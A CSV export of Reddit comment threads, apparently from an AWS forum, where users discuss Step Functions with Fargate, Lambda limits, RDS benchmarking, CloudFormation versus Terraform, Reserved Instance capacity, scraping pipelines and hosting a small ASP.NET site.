g764mft,j2llwh,"It's text data.  We have various enrichments baked into ECS/Fargate containers.  Right now, they're strung together by SQS queue's, each enrichment draws down from the previous queue and then pushes into the next one.  So, each enrichment can scale based on the `ApproximateNumberOfMessagesVisible` in the queue it draws from.  If I use a SFN to orchestrate, theoretically, I would take away the queue and thus the way in which ECS would know to add more tasks to the Fargate service.

The problem that I see is, each Step Function execution is isolated and independent from all other executions (and rightfully so), so there is no native way to have visibility over the total amount of work for each individual enrichment, except for (perhaps) alarming on the `ExecutionsStarted`, except that may well be stale data by the time the alarm reacts to it.  

Thoughts?",1.0
g76fvt7,j2llwh,"You'd probably still need a queue somewhere, even if you're watching Cloudwatch metrics, because you're going to need to trigger actions based on those metrics and you want something to be able to be triggered to do that.

Yelp actually put out an engineering post on how they did this using a third-party API.  Granted, they're dealing with much higher volumes, but this might at least point you the right way and show you some metrics they used: [https://engineeringblog.yelp.com/2019/06/autoscaling-aws-step-functions-activities.html](https://engineeringblog.yelp.com/2019/06/autoscaling-aws-step-functions-activities.html)

Is the reason for using step functions here solely to gate the steps or handle failures?  It seems like setting up job --&gt; queue --&gt; job --&gt; queue might be a better architecture if there's a ""standard"" set of data/output from one job to the next.",2.0
g76l1ry,j2llwh,"Thanks, I'll read it.  And yeah, the reason for the SFN is to gate the steps, but also to be able to handle failures outside of the failed code, isolate the failure from other records/jobs being processed, etc.  The ability to move through a complex decision tree outside of the individual codebases is pretty compelling IMO.

To your point, the outputs are standard, so the existing queue, job, queue, job architecture is by no means ""bad"", but it can be difficult tracing errors through that pipeline, so being able to redirect failures to something else that can try to pull together data, and paint a more complete picture, all in one spot...again, compelling. 

If, at the end of the day, SFN is not a good solution for it, so be it...  Thanks again though!!",1.0
g76mybd,j2llwh,"No, that makes a whole lot of sense... and maps well to how Yelp was using it, as well, to ensure that a transaction completed as a whole or didn't complete at any step and could be rolled back.",2.0
g77prhe,j2llwh,"&gt;What would you all use to scale the number of Fargate tasks when orchestrating the data input to the Fargate task with Step Functions?

There is no such scaling. (Or, from another perspective, there is infinite scaling out-of-the-box.) ECS tasks scale within a Service, but Step Functions' ECS/Fargate integration points [directly to a Task Definition](https://docs.aws.amazon.com/step-functions/latest/dg/connect-ecs.html) – there is no Service. It will start a task, perform the operation, then the task will exit (because the process inside of it has exited). This happens every time that state is reached.",1.0
g784wja,j2llwh,"So, is it fair to liken the behavior to the way in which Lambda operates out of the box (new container is initialized if one is not free)?

If I’m understanding correctly, so long as I don’t need to slow it down for any reason, this is exactly what I want (ie I don’t need to worry about having to scale at all).",1.0
g787zrq,j2llwh,"&gt;new container is initialized if one is not free

A new task is always created.

Not _super_ related, but the ECS/Fargate integration in Step Functions is best fit when some limit of Lambda is being exceeded. Lambda Functions can do quite a lot – you should check it out first for any Task step in a State Machine.",1.0
g7887b8,j2llwh,"Yeah, the fargate tasks exceed Lambda’s memory limits.  Thanks for the help!",1.0
g764hq2,j2llwh,"lambda. whatever you ask, the answer is lambda :) lambda is perfectly integrated with step, and you can scale your clusters freely with it (e.g. python/boto3). you only need to make sure your autoscaling won't immediately scale the cluster back.",-1.0
g764stg,j2llwh,"So, SFN hands the data off to Lambda, which then scales and submits the job to ECS/Fargate?

How would the lambda know how to scale in/out the cluster?",1.0
g768d66,j2llwh,well i thought you know it. also where is the data? usually etl is done in a way that the target has access to the files (or s3).,1.0
g76k3in,j2llwh,"Depending on the type of event (data), it could be on S3 or it could be passed in by the step function.",1.0
g75ze2l,j2kspp,"What's the size of your response? I just found this out yesterday, Lambda has a 6MB limit on request/response size. (To add to that, ALBs can only handle 1MB if the response is coming from Lambda.)

I'd love to know the reasoning behind this...I can only assume its to mitigate some sort of abuse pattern.",1.0
g761gd4,j2kspp,"The response are 5400bytes roughly, but seeing as this is only half of the response with the other half being left out, it would make sense that this happen due to the full response being above limit.   
Do you know if its possible to increase this limit? 

Ohterwise ill see if i can find a way to do some magic with the code to only get the part of the response that i actually need, or maybe i can compress the response and get more data that way aswell.",1.0
g765a32,j2kspp,"Ignore what i just wrote, 5400bytes is nowhere near the 6MB limit, so im back to square one have no idea why my JSON object gets cut in half...",1.0
g75zuv7,j2kspp,Is the Lambda failing (e.g. timing out) or completing successfully?,1.0
g761hcj,j2kspp,"No errors, and it completes successfully.",1.0
g76im4v,j2kspp,Try urllib2?  Try `json.dumps(content)`?  Now i'm just grasping at straws....,1.0
g77bpik,j2kspp,I've encountered all kinds of crazy issues with lambda. Have you tried logging the response and seeing if it shows up in cloudwatch? Then you can determine if it's a request or compute issue.,1.0
g788cu2,j2kspp,"This is more of a Python question than a Lambda question.

urllib2 is extremely low-level and won't automatically handle a lot of stuff that most HTTP clients handle transparently.  It will only give you grief.  I'd recommend using `requests` instead.  It's even included in boto3!  https://binx.io/blog/2018/11/10/requests-vendored-boto3/",1.0
g79msh6,j2kspp,"Update: Turns out Lambda has limitations to how much it can print to the console at one time,  which turned out to be why my JSON object were being chopped in half. However even if not the full response is posted in the console, I can still access it trough the object, and in case the full object needs to be read, it is included in the CloudWatch logs.   
Mystery solved",1.0
g75rmqe,j2iwpk,"What causes load on your database? Do you have long running queries, or transfer lots of data in or out? 

I'd set up and set off jobs that repeatedly run the worst offending queries (or load in external data, whatever your database's biggest jobs are) sequentially and concurrently and use Performance Insights to watch what happens. 

I have some old queries I run on data dictionary  tables that give me some stats on queries. They're not fit for passing on, really, I can work out what's going on from them, but it's not like some facility I've created to do it. 

Interested to hear other people's ideas",2.0
g75xcyr,j2iwpk,"You may need to write your own program to throw lots of queries at the DB.  Especially since no generic load tester will know the structure of your schema, etc.

Are you wondering if RDS is as fast as a premise DB?",2.0
g78q65y,j2iwpk,"This is what I do for performance benchmarks

1. Spinup the RDS
2. Spin up EC2 and configure percona PMM tool(A better MySQL monitoring tool)
3. Use multiple EC2 or EKS cluster to run the sysbench from multiple zones
4. Or create a sample locust script
5. If need run the test from multiple regions as well
6. Then tune the MySQL parameter or instance type based on the results",1.0
g75uimf,j2iwpk,"Here’s a quick tip: Allocate enough RAM so the systems working set is in RAM and you don’t need to rely on disk IOPs for performance.

Provisioned IOPS aren’t cheap and depending on your workload this method might mean you can use GP2 disk.",1.0
g7682on,j2iwpk,"&gt; Allocate enough RAM so the systems working set is in RAM

That assumes you're not working with a huge data set!",1.0
g76bg5y,j2iwpk,"Agreed, it’s not always possible but if you can it’s a win for performance and cost.",1.0
g77rbjc,j2j590,"Maybe I’m being obtuse, but how does it determine what servers to shutdown?",2.0
g788h72,j2j590,"Good question.  With my script, I check to see who is logged into the VPN, and if they've been disconnected for over twenty minutes (except during local lunch time), it hibernates the instance.  It's worked great for over four years.",1.0
g75y71o,j2fvfs,"an actually useful link would be better.

[**https://registry.terraform.io/namespaces/offensive-terraform**](https://registry.terraform.io/namespaces/offensive-terraform)",0.0
g759iyt,j2fqqq,"There's not really a reason you need to ""wait"" for container instance registration outside of normal initialization processes.

Startup isn't really a concern; if an ASG instance doesn't register as an ECS container instance, ECS will not place tasks on it. If you have work you need to do on the instance first, just do all that in the cfn-init/metadata before starting the ECS Agent.

Shutting down a container instance has different implications as work could still be happening and requests could still be taking place, so you need to drain the instance of tasks first.",2.0
g75ykl8,j2fqqq,"I would say if your ASG policy is using a metric of the ECS… If the Instance fail to connect, it will need to scale again, so in the worst case scenario your application will not be impacted.

Today I use the metric for ""Memory Reservation"" from ECS at the ASG policies to scale up and down. Because all the applications does not have problem with CPU.",1.0
g756hw7,j2euog,Any reason to use CloudFormation over Terraform these days?,7.0
g75ftyg,j2euog,"More robust, less buggy, no need to worry about storing states between teams, or keeping binaries in sync, export mechanism (passing values between stacks), drift detection, stack sets, included in AWS support, easy to find documentation or examples.",26.0
g75gy9r,j2euog,"Except the binaries versioning, state and AWS support I find terraform superior in every aspect. Faster service adoption, no parameter limit, more documentation and modules made by the community.",10.0
g75mz1p,j2euog,"TF is good. Not denying. But if you are only on AWS then why bother with something not maintained by AWS.. especially with custom reaources, macros and private registry",7.0
g75r583,j2euog,"Mostly because AWS themselves treat CFN as a second class product. Terraform needs to be better to compete, and mostly succeeds.",12.0
g75sud8,j2euog,They certainly would do good treating it as 1st class citizen although some features released by teams are not fully CRUD capable at release time.,1.0
g75vqgq,j2euog,"If CFN was more feature-rich on day 1 of service release and supported global, interpolated variables like Serverless (and I think TF) does, I’d make the push at my company to switch over from Serverless.  

I can deal with custom resources for some things, but when I’ve got custom resources all over the place, it’s just too much....There are places where one needs a CR for implementing what AWS would consider best practice.",4.0
g75w3dd,j2euog,"I pushed for CFN here vs huge TF pressure. We have 0 regrets and everyone in the team knows exactly what to do, everything just works.
I built [ComposeX](https://github.com/lambda-my-aws/ecs_composex) before ecs plugin and copilot were released and slowly got the team to use it  and it has been well received and successfully done lots of CICD using CFN all over the place",2.0
g75znes,j2euog,"Don’t get me wrong, I use CFN for my own personal stuff I just don’t think I’d be able to sell it internally...

ComposeX looks cool!",1.0
g761rm5,j2euog,"Cheers mate. Any feedback is very welcome if not actively wanted.
I need to blog about recent work done at work with it.",1.0
g75h306,j2euog,"Yeah because aws is cli first and so is the terraform aws provider the adoption is much easier for terraform. However, aws do seem to be pushing cdk quite abit",1.0
g76re0m,j2euog,"Also supports deploying to other clouds and Kubernetes which makes deployment scripts much nicer.

I appreciate not everyone needs this, but for my team this is critical.",1.0
g75wogl,j2euog,"Most of these aren’t issues with TF either. 

Have you used TF in the past few years?",5.0
g76bgra,j2euog,"I'm using it right now and those things I'm missing about it.

Regarding bugs for example just in latest 0.13 version terraform started removing the exact stack that was deployed, previously it used the code in your working directory (which most of the time worked, but if you had a stack that wasn't updated, and are trying to remove it then good luck).",2.0
g76co3t,j2euog,"That was a bug that was addressed. .13 was a big change. :)  Outside of that I can't think of the last time I saw a TF bug and we run some fairly complex setups?  


As to storing state between teams that hasn't been an issue in like 2-3 years?    


Passing values ""between stacks"" stacks is a CF term, but I assume you mean modules?  If so that's what outputs/datasources are for (you can also use something like SSM Parameter store to do it too), and this has been in there for years.  


drift detection:  You mean ""terraform plan"", right?  because that's pretty fundamental.

stack sets: Modules?

Sorry man, but it doesn't seem like you have much actual TF experience.",4.0
g76jofx,j2euog,"I experienced 2 other bugs that aren't still fixed:

1. if you have an existing VPC setup with subnets etc and also make some changes to a default security group, and you modify it to add IPv6 support (including modifying it to allow outbound ::/0 traffic) then TF will error out saying the ::/0 entry already exists. If you don't that entry, and create stack from sratch the entry won't be added.
2. if you have stack with already set up IPv6 and you revert your changes (for example you're rolling back your chances from #1) TF will fail because will try to remove IPv6 from the VPC first before removing the addresses from subnets.

None of these issues happen with CF. Actually I forgot to add another thing that when CF fails it will roll back the changes getting your stack to the state it was before the changes. With TF it's A-OK to just leave it in a broken state. 

&gt; As to storing state between teams that hasn't been an issue in like 2-3 years?

it's still a problem, I mean you can use S3 to store the state and DynamoDB to store lock (BTW: isn't me that I see a problem with storing locks in eventually consistent database?)

&gt; Passing values ""between stacks"" stacks is a CF term, but I assume you mean modules? If so that's what outputs/datasources are for (you can also use something like SSM Parameter store to do it too), and this has been in there for years. 

outputs/datasources is basically equivalent of parameters and outputs in CF, I'm talking about exports. For example I can create a stack that sets up the whole networking part, and then spin up another stack on top of it and I don't need to pass VPC, subnets, security groups etc.

SSM can emulate that, but it is a hack.

&gt; drift detection: You mean ""terraform plan"", right? because that's pretty fundamental.

That's not exactly it, this shows what will be done, and CF also does that, but I suppose that you can get that functionality by:

- restoring your files to the exact version that was deployed
- running terraform refresh
- running terraform plan

The first one might be problematic. TF should be able to compare the state to what was originally deployed.

&gt; stack sets: Modules?

Not exactly. Stackset ensures that template is deployed in accounts under certain OU. If new account is added or stack is modified it proceeds to apply these changes there.",2.0
g77um3e,j2euog,"&gt;if you have an existing VPC setup with subnets etc and also make some  changes to a default security group, and you modify it to add IPv6  support (including modifying it to allow outbound ::/0 traffic) then TF  will error out saying the ::/0 entry already exists. If you don't that  entry, and create stack from sratch the entry won't be added.

[https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default\_security\_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_security_group)

Default security groups/vpc configs/etc in AWS are funky.  Not because of TF but because AWS treats them differently.   There's different providers for those.  I'm assuming under the hood cloudformation accounts for this via some fuckery.

Also why are you using the default security groups?  It's like trivial to create one in code.

&gt;if you have stack with already set up IPv6 and you revert your changes  (for example you're rolling back your chances from #1) TF will fail  because will try to remove IPv6 from the VPC first before removing the  addresses from subnets.

This is an AWS API thing.   Modifying VPCs does \_not\_ automatically modify route tables (usually) and it should never ever ever automatically change your route tables without you telling it to explicitly do as much.

It sounds like you'd probably just want to use a tested module that does this stuff for you.  There's a pretty standard one that does all the movement under the hood for you so you don't have to tinker w/ this stuff.  Check out [https://github.com/terraform-aws-modules/terraform-aws-vpc](https://github.com/terraform-aws-modules/terraform-aws-vpc)

But yeah not bugs, quirks of AWS.

&gt;None of these issues happen with CF. Actually I forgot to add another  thing that when CF fails it will roll back the changes getting your  stack to the state it was before the changes. With TF it's A-OK to just  leave it in a broken state.

This is why you run TF plan.  Also reversion is incredibly simple if you're using versioned modules.  If you're not, you should be.

&gt;it's still a problem, I mean you can use S3 to store the state and  DynamoDB to store lock (BTW: isn't me that I see a problem with storing  locks in eventually consistent database?)

It's absolutely stable, safe and fast enough that you'll never ever have to worry about ""eventually consistent.""  This is just a ""but what if!"" gotcha.  If you're not doing this, you're doing it wrong and you will absolutely run into problems.

&gt;For example I can create a stack that sets up the whole networking  part, and then spin up another stack on top of it and I don't need to  pass VPC, subnets, security groups etc.

This heavily depends on your stack.   If you're doing incredibly minimal stuff in default VPCs (sounds like you are) then it just plops stuff in the defaults.  If you start building marginally complex configs (VPC + priv subs + pub subs + db subs ) you'll have to feed the right info to Cloudformation as well.

The difference is in the assumptions made.  TF doesn't make a guess that you're using a default VPC or not and it certainly doesn't want to be ambiguous so yeah you're going to specify (or if you're smart inherit via outputs/datasources/external thing like SSM or vault) and make things automatic.

&gt;SSM can emulate that, but it is a hack.

See prior answer.   The difference isn't in your vars it's that you're relying on defaults for everything.  This will break in CF once you start doing complex stuff.

&gt;That's not exactly it, this shows what will be done, and CF also does  that, but I suppose that you can get that functionality by:

Yes, yes it is.   If you run a TF module against AWS and it does a thing, then someone modifies it by hand both TF and CF will show you this difference or ""drift.""  AWS makes you jump through some hoops and TF does it via plan, but it's the same thing.

I'm not sure why you're doing the extra steps in TF?   Also code reversion should never be a problem with versioned modules.   They're insanely powerful and incredibly easy to implement.  When done, the functionality is WAY better than what CF provides.

I mean I hate to say it man, but your problems are more or less ""welcome to a new IaC platform"" problems.",1.0
g75bpae,j2euog,StackSets,17.0
g759f6n,j2euog,Neat. Started work on something today that could actually use this.,1.0
g76w8ee,j2euog,Can u share the use case in simple terms?,1.0
g77idjl,j2euog,"Just creating the same general networking infrastructure stack in multiple regions. Nothing you can't already do w/o this functionality, this just makes it a bit more compact and simple for my usecase.",1.0
g75b1cb,j2e2ak,"Look into Elastic Beanstalk. You only need to care about code. If cost &amp; efficiency are your concerns, and you are simply deploying a nodejs app, neither CodeDeploy nor Docker is for you. 

Lambda could be another option if your app is event-driven, you can tolerate cold start, and runtime execution is less than 15 minutes.

CodeDeploy is for CI/CD and automated management of deployment to multiple environments. If you know docker, then you’ll deploy with ECS, but you will still need to manage the EC2 instances behind the scene.",2.0
g75etn4,j2e2ak,You can also use ECS with fargate and don´t need to manage EC2 instances,3.0
g78x9ir,j2e2ak,"u/modlinska u/KapuzenSohn u/dcc88 thank you for the responses! Couple of things:

1) With Elastic Beanstalk, will it automatically update the application when a new change is made on Github? Is there anyway to integrate this to automatically deploy?

2) Does Elastic Beanstalk work with ML/AI? I currently have a Python server that I use to send POST requests to get data back. I was planning to put it on sagemaker so that I can use a node endpoint to access it. Will this work with Beanstalk?

3) Is Elastic Beanstalk serverless? What applications can I use to make my app serverless and what are the benefits of not having servers?

Thanks

Rushi",1.0
g799pmg,j2e2ak,"1. Yes, you can setup codepipeline to get your source code update from Github and deploy it on elastic bean.
2. Yes, it depends on your hardware requirements, you could add a more powerfull cpu instance, an inf1 instance, an elastic inference or gpu
3. No. (Lambda, Api gateway, dynamodb or aurora serverless ) Well you only pay for the time your code is actually running to process a request.
It's usually dirt cheap, you could even not pay with free tier. BUT it means refactoring to be serverless (which using node should be acceptable ). I would not expect to run ml/ai algorithms on serverless.",2.0
g7a2wrb,j2e2ak,"u/dcc88. Take a look at this link:

[https://aws.amazon.com/blogs/machine-learning/call-an-amazon-sagemaker-model-endpoint-using-amazon-api-gateway-and-aws-lambda/](https://aws.amazon.com/blogs/machine-learning/call-an-amazon-sagemaker-model-endpoint-using-amazon-api-gateway-and-aws-lambda/)

It shows how to use lambda with sagemaker. Is that satisfactory? Look up to a previous comment to see my use case.",1.0
g7b2zus,j2e2ak,"generally yes, if the alg takes a while to respond I agree you should add sqs",1.0
g78zxcm,j2e2ak,"1. No. But you can use this to automate deployment from github to ELB: https://github.com/marketplace/actions/beanstalk-deploy
2. I’m afraid I can’t answer this question since it’s not clear what you’re trying to do: are you planning to migrate your Python server to SageMaker, then use your nodejs app to retrieve the data with the node SageMaker endpoint? Where does AI/ML come in?
3. No. To be serverless, re-architect your app with API gateway + lambda + SQS + DynamoDB. From what you’ve been describing so far, I think you can go the serverless route, but my hunch is you’re probably saving only a handful of dollars per month with serverless vs EC2",1.0
g7a2rg9,j2e2ak,"u/modlinska for #2, I am not sure. I currently have a Python Flask server that takes in data from the node app and returns an output after analyzing it with a ML algorithm. Do you think it would be better to leave it in a pytho file or migrate it to sagemaker? And how would I use ELB with that",1.0
g7aoqlq,j2e2ak,"Does the flask app or the node app “analyze with AI/ML”?

Regardless I would put a queue in between the apps to handle request and return response asynchronously. In AWS you’d do this with SQS, so overall I recommend moving both the flask and the node apps over to AWS. 

That being said, I advise you to seek advice from a software architect, sit down with them and explain why you’re trying to do. Seems like you need step by step explanation and implementation. I think getting snippets of Reddit responses will just confuse you further at the moment.",1.0
g75c1r4,j2e2ak,"If it's nodejs, u should try and make it serverless
It would be much better for costs",1.0
g74xypa,j2b39n,Have you opened a support case with AWS?,1.0
g757dg7,j2b39n,I believe I do - send me a PM tomorrow morning,1.0
g81638z,j2b39n,"\+1, jittery windows and a center flashing square.  I opened a ticket with AWS and NVIDIA (I suspect it's a compatibility driver issue).  Only fix I have right now is to use the Windows Basic Display driver instead of NVIDIAs.  I can't find an older version either.",1.0
g81euzd,j2b39n,Yes! Exactly same issue.. so frustrating. I am happy though I am not alone in some sick way. Please let me know if you get any kind of resolution,1.0
g81zsz8,j2b39n,Send me a DM and I will give you a link to 3.0.9,1.0
g820zgg,j2b39n,reverting to 3.0.9 fixes it,1.0
g747271,j2a1lu,"If they don't have the capacity, they won't let you make the reservation.  RIs used to be capacity reservations and it was by region.  If the capacity was not available, you couldn't buy it.",10.0
g74hxub,j2a1lu,"RIs used to be capacity reservation; you seem to refer to Regional RIs but you have different types of RIs.

There are two types of RIs: a) Zonal RIs and b) Regional RIs.

Zonal RIs provide capacity reservation in the specified AZ and instance type combination but you have to commit for a 1-yr or 3-yr plan and also they provide discounts.

Regional RIs do not provide capacity reservation but provide discounts on billing along with flexibility of applying discounts on instance usage within same instance family on Unix/AL RIs.

More details here: [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/reserved-instances-scope.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/reserved-instances-scope.html)",3.0
g75mrsc,j2a1lu,"Prior to this split, all RIs used to be zonal RIs.",1.0
g748t60,j2a1lu,"&gt;RIs used to be capacity reservations

Are you saying that even if I purchase a ""*Reserved Instance*"", there are no guarantees that I will be able to spin up the reserved instance? Do you still need to create the ""*Capacity Reservation*"" for already purchased RIs?",1.0
g749x7s,j2a1lu,"By default there are no guarantees. It depends on the type of RI. 

https://aws.amazon.com/premiumsupport/knowledge-center/ri-reserved-capacity/

It is probably better to combine RIs with separate capacity reservations for greater flexibility though.",3.0
g74egm9,j2a1lu,"Thanks! I guess the next question is: can my currently running instances be taken away from me if I don't have a capacity reservation? In other words, can AWS terminate my currently running on-demand or reserved instances?",2.0
g74ht88,j2a1lu,"If you are using on-demand or reserved instances, no. If you are using Spot, yes.",5.0
g74wigm,j2a1lu,"I'm not using spot but my concern is more about high demand during the busy holiday times (Black Friday, Cyber Monday). Could AWS terminate my already running reserved instances just to hand them to the guy who just bought the ""capacity reservation?"" If the ""instance capacity reservations"" have priority over the reserved instances, they will have no choice but to terminate some of the already running instances without reservations?",1.0
g753syp,j2a1lu,"No. Capacity reservations are only given out when capacity is available, and other customers running on-demand or using RI's do not take their place even if the capacity reservation is not being utilized. Think of a capacity reservations as always running and using that slot (you are charged as if it is always running too).",1.0
g74gvsm,j2a1lu,AWS will not terminate your currently running On-Demand or Reserved instances.,3.0
g77535o,j2a1lu,Well there is [one important exception](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/monitoring-instances-status-check_sched.html#schedevents_actions_retire).,1.0
g74rywn,j2a1lu,"No. But, if there is an issue that causes your instance to fail, like an early retirement, and it goes to STOPPED, then there is a chance you will not be able to start it.",2.0
g74eoxh,j2a1lu,"I don't think it's common but it's possible it might happen, especially if there's a hardware failure somewhere.",1.0
g74f1dv,j2a1lu,"Yes, I imagined this is how it works. The ""immediately"" is a bit misleading here",1.0
g74ftl6,j2a1lu,"If you are getting an insufficient capacity issue in a region while creating an On-Demand instance, you will get the same error while creating an On-Demand Capacity Reservation.",5.0
g749vc9,j29vsr,Has anyone compared SAM to serverless framework recently? I've been using serverless framework for almost half a year now and it's so much easier (also in terms of plugins and local testing),1.0
g74yncu,j29vsr,"Has Serverless fixed the requirement that you need to run as administrator in order to provision resources?  It used to require Action :""*"", Resource : ""*"".  Has that changed?",1.0
g75gqzo,j29vsr,You mean when you deploy? I don't know. We're all equal admins whenever we create a new aws account for our clients.,1.0
g744o6a,j278ob,The typical done thing is to create a service user on GitHub with the token permissions required.,4.0
g76a2t7,j28dqt,"Is there a reason why you're sending JSON via email?

It sounds like an X Y problem.",2.0
g74xz6y,j28dqt,Are you sending through smtp over port 25? If so use a different port as they are more strict on throughput and content: https://docs.aws.amazon.com/ses/latest/DeveloperGuide/smtp-connect.html,1.0
g73vhi5,j28dqt,Side quest: why SES? Why not a messaging service like SNS?,1.0
g73y3jk,j28dqt,"The origination is an email that comes from a variety of domains that contains the JSON.  I don't know of a way to send an email TO an SNS Topic from say gmail.  If so, I'm all ears.",1.0
g73vm17,j288iz,"Supported where? If it's not purchasable in Route53 domains, you can still create a Route53 zone with it and and buy the domain elsewhere",9.0
g741ics,j288iz,Oh really? Is it possible to port it into route53?,1.0
g742t50,j288iz,"You don't have to transfer the domain registration, you can do just DNS. You don't even have to do that, you can probably just create the appropriate A/AAAA/CNAME records in your existing domain DNS.",4.0
g7430i4,j288iz,"I'd like to transfer the domain registration if possible, is that doable?",1.0
g74b4v8,j288iz,"No

https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/registrar-tld-list.html",4.0
g74pni2,j288iz,"I think you're confusing domain registration with being the destination of a dns request. They are two different things.

Keep your domain registration but point it to aws. I don't have any domains registered with Amazon but still send requests there.",2.0
g741net,j288iz,They are supported in Route53 zones. I have one set up,1.0
g74z0qc,j288iz,"I hope .org.au is available before .ai (.org.nz is available, after all)",1.0
g75lnyb,j288iz,just set up a new hosted zone in Route53 and replace the NS records on your domain registrar with the ones from your new hosted zone. once the change propagates you will be able to manage your DNS from AWS. Note that once you make this change any records you add from your registrars web console will have no effect.,1.0
g74b4vy,j288d3,"I use ECS to do this on a schedule.  Timer kicks off a container, at startup the process starts, upon completion the whole things shuts down.  Just another way to do it.

Terraform is pretty straight-forward.  I use PluralSight for my training these days, but there are plenty of aws with tf books out there.  A basic tf crash course, and then focusing on the aws provider and examples is how I would spend my time.  CloudFormation sucks compared to tf.

If you don’t need to do this over and over and over again, I would skip tf all together and just take notes on how you set it up.",3.0
g74brx1,j288d3,I second what he said. EC2 is enough. And once you dockerize the app you can run a enough containers that you wouldn’t need terraform or another instance(depending on if you get a strong enough EC2 instance),2.0
g76ugyi,j288d3,"We probably don’t need to deploy the whole thing to the production server over and over again, what we might do over and over again is running it locally.  
  
What is the usual way to mimick the aws services locally?",1.0
g76uyx8,j288d3,"This is where containerized apps have an advantage, you can just spin it up locally and test it.",1.0
g76vvs9,j288d3,"So something like rabbitMQ would replace SQS locally?  
Is it possible to spin up scrapper instances (docker images) when a message gets in the rabbitMQ queue?",1.0
g751drd,j288d3,"Here are some questions I have that might help me offer some advice:  
- What language will you use to write the scraping scripts?
- Where are you planning to store the data you scrape? (RDS, S3, DynamoDB, elsewhere?)
- Are you scraping the same 10 websites every 24 hours? Or are you scraping the same websites with different parameters (different pages of the 10 websites)?
- Are you open to using serverless technologies like AWS Lambda? 
- Do you use CI/CD?
- Does the scraping require a headless browser? Are the websites you are scraping public or do they require authentication? 

Here are some thoughts about infrastructure as code. You can implement cron scheduling in your application logic or in your IaC. For example (using python and celery/beat as an example since that what I would use for this task), you could use celery beat to trigger your task every 24 hours, or you could schedule a lambda function to run every 24 hours. Which way you go might depend on answers to the above questions. 

The last scraping project I did used AWS CDK with Lambda functions and SQS. I found CDK very easy to use with Lambda functions and SQS. For example, there is construct to configure an Amazon SQS queue as an event source for AWS Lambda ([https://docs.aws.amazon.com/cdk/api/latest/python/aws_cdk.aws_lambda_event_sources/SqsEventSource.html#sqseventsource](https://docs.aws.amazon.com/cdk/api/latest/python/aws_cdk.aws_lambda_event_sources/SqsEventSource.html#sqseventsource)). There may be something similar in Terraform but I am not as familiar with that tool.",1.0
g76ty6u,j288d3,"Hello!  
Thanks for the informations and the questions.  
1) the scrappers are written in Rust and we plan to code a microservice in Node which would have a rest api and also would dispatch the jobs for the workers somehow  
2) we plan to store the data but we’re not sure where for now. Probably a relation db like postgres since we have relationships between entities so I would say RDS  
3) we scrape the same websites, it’s not a crawler. One scraper instance might scrap different pages of the given website  
4) yes  
5) not for now but we plan to  
6) the websites are public, for now we don’t use a headless browser, just a fake user-agent header",2.0
g73lc57,j267hm,"Verify your access policy and determine if your source IP address is passed through NGINX. Also check if you have any ACLs and Security Groups (on your nginx machine for example) that might impact traffic.

Per the article, the NGINX config is going to be very important. Specifically the bit about setting the request header to the VPC address.          `proxy_set_header Host` [`vpc-xxx-xxx-xxxx-xxxxxx.us-west-2.es.amazonaws.com`](https://vpc-xxx-xxx-xxxx-xxxxxx.us-west-2.es.amazonaws.com)`;`Also, setting the request address to the NGINX IP:  `proxy_set_header X-Real-IP xx.xx.xx.xxx;` 

The other thing you could try is use a bastion host as a proxy over ssh.",1.0
g83p2s9,j260kr,"What platform do you use?  We had problem with getting it work in node.js, because in order to use sampling, you have to have ULR annotations in segments (if you use custom xray implementation (i. e. not express or restify), have a look at `AWSXRay.middleware.traceRequestResponseCycle`). Second thing to consider are permissions: if you are configuring central sampling rules in AWS console, you should have granted `GetSamplingRules` permission to your service (otherwise it could not download configured sampling rules).",2.0
g84rxoz,j260kr,I'm using Java. My confusion is if just setting the rate and fixed target to 0 should be enough or if I need to do something more,1.0
g84s0ru,j260kr,I'll have a look in the Trace Response Cycle!,1.0
g852d5y,j260kr,"Do you see URL field filled, when you look in you X-ray console?",1.0
g733xsv,j23s3t,"AWS has a product that can be used for hosting “simple” web application:

https://aws.amazon.com/lightsail/

It might help you",8.0
g73u3xb,j23s3t,"I've been watching YouTube videos about setting up Lightsail and it's way too advanced for me.  Creating Linux Wordpress instances and using SSH to type stuff in the command line?

I can't do any of that.  I can only write code.  I used Visual Studio to create a bunch of .aspx files, .aspx.cs files, .cs files, .js files, and .css files.  They work together to connect to a .mdb file to run SQL queries on it and display data.

I don't even know how to run my program outside of Visual Studio.  All I know is that if I hit the Debug button in VS, it opens Firefox to a local version of my website.  And I can use it to get data from my local database.

I just want someone else to be able to type in a URL, get my same website (no idea how that's supposed to happen outside of Visual Studio because it doesn't seem to be creating a .exe file), connect to a copy of the database, and query it.

That Lightsail has an FAQ (https://aws.amazon.com/lightsail/faq/) but even the answers are nightmare of jargon.

EDIT: Is this: https://aws.amazon.com/getting-started/hands-on/host-net-web-app/ what I'm supposed to do?",1.0
g75x503,j23s3t,LightSail offers Windows VMs. You just bring up an instance and RDP into it.,1.0
g7693jg,j23s3t,"Yes, it does.  Thank you.  I figured it out after a few hours.",1.0
g730epf,j23s3t,"AWS can definitely do it, but you might have an easier time with a product that was built specifically for your use case. Google ""host access database online"". There seem to be many options.",4.0
g75hpfe,j23s3t,"I believe you don't need to use AWS, it is to reduce your cost too. For simple website, shared hosting should be enough to handle your traffic. Moreover if you are new in development, it must quite difficult using cloud service like Azure or AWS. For shared hosting, I can't recommend Asphostportal enough, I also use their service, they fully support Microsoft Access. Feel free to visit their site.",2.0
g7691s2,j23s3t,"Thank you for the idea.  I'll look into them in the future.  As it stands, I managed to follow the directions to set up a Lightsail Windows Server 2016, figured out how to connect to it, figured out how to put my Access database on it, figured out how to publish my Visual Studio code, and now have a working website.

I'm actually quite proud of myself.  I have five years of professional development experience, but all I do is code.  My wife calls me a ""half-nerd.""

As soon as I figure out how to get my domain name to point to the static IP address of my Windows Server, I'll be all set.",1.0
g76tdpt,j23s3t,"No need aws, any cheap host can host some html/css/js jquery",1.0
g7312we,j23s3t,AWS is overkill. You should probably look at places like go daddy or square space. They should be a lot cheaper and more catered to what you need.,-2.0
g7320ik,j23s3t,"Aren't those for people who need some kind of UI to help them make the webpages, instead of manually building them?

I have created the pages manually.  When I run my program in Visual Studio, it opens up in Firefox locally.  Then I can manipulate the pages that I created and hit a button, which makes an AJAX call into my C# files, which then connects to my Access database, and then it constructs an HTML table with the data, and returns it to a div on the website.

Isn't that more complex than what GoDaddy or SquareSpace can do?",0.0
